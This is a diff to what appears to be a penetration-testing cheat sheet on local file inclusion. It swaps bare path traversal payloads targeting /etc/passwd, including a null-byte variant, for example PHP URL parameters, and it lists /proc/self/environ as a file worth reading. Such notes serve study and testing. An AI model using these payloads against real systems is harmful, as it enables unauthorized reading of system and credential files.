@@ -1,11 +1,9 @@
 # File Inclusion
 
 ## Local
-- Payloads
-```
-../../../../../etc/passwd
-../../../../../../../../../../etc/passwd%00
-```
+- Exploit
+  - ```example1.php?page=intro.php../../../../../etc/passwd```
+  - ```example2.php?page=intro../../../../../../../../../../etc/passwd%00``` 
 
 - Intersting files
   - ```/proc/self/environ```
